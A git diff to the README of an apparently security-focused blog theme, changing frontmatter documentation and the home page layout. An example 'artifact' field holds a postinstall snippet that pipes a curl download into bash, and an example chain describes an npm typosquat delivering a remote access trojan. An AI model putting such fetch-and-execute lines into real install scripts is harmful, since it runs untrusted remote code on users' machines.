@@ -19,7 +19,11 @@ tags: [web, xss]
 # draft: true
 # category: Malware · Supply chain     # label above the title; defaults to the first two tags
 # ships: 2 YARA rules                  # what the post hands you, shown next to the date
-# chain:                               # the attack chain strip and card
+# artifact:                            # a real snippet from the post, shown when it is the featured post
+#   label: postinstall script
+#   code: |-
+#     exec("curl -L https://... | bash")
+# chain:                               # the attack chain card at the top of the post
 #   - { step: "npm install", note: "A typosquat of @angular/core" }
 #   - { step: "CHAOS RAT", note: "Remote access on the host", hot: true }
 ---
@@ -41,9 +45,11 @@ That creates the file as a draft. Drafts are visible in `npm run dev` but never 
 
 ### Attack chains
 
-`chain` is optional. When a post has one, it shows as a strip of steps on the homepage and the archive, and as a numbered card at the top of the post. `hot: true` paints a step red, so use it for the step that does the damage. The newest post with a chain is the "Latest trace" card in the homepage hero; if no post has one, the hero shows only the bio.
+`chain` is optional. When a post has one, it shows as a numbered card at the top of that post, and nowhere else. `hot: true` paints a step red, so use it for the step that does the damage.
 
-The hero headline, bio and topic chips live in `src/consts.ts` under `hero`.
+### Home page
+
+Your name is the headline. The label above it, the one-line bio and the rows of the ID card live in `src/consts.ts` under `hero`; the card adds the post count and last post date itself. The newest post is featured under the name. Its left panel shows the post's `cover` if it has one, otherwise its `artifact` snippet, otherwise the text takes the full width.
 
 ### Images
 
@@ -57,9 +63,9 @@ Put images in `src/content/blog/images/` and link them with a relative path as a
 - A sticky "On this page" rail on posts with two or more sections
 - Click-to-zoom images ([medium-zoom](https://github.com/francoischalifour/medium-zoom))
 - SEO: canonical URLs, meta descriptions, Open Graph and Twitter cards, JSON-LD (`BlogPosting`, `Blog`, `Person`), `sitemap-index.xml`, `robots.txt`, RSS at `/rss.xml`
-- Warm off-white on near-black with one signal yellow, hard 1px rules, big uppercase headlines: Archivo for text and headlines, IBM Plex Mono for code, dates and labels
+- Warm off-white on near-black with one signal yellow, filled hard-shadowed panels, big uppercase headlines, text greys at 4.5:1 or better: Archivo for text and headlines, IBM Plex Mono for code, dates and labels
 - Self-hosted fonts, no client-side framework, zero JS on the page except image zoom, mermaid diagrams and the code copy buttons
-- `/` is the index: headline, bio, links, the latest attack chain and the latest posts; the full archive lives at `/blog/`
+- `/` is the index: your name, an ID card, the newest post featured and the rest listed; the full archive lives at `/blog/`
 
 ## Local development
 
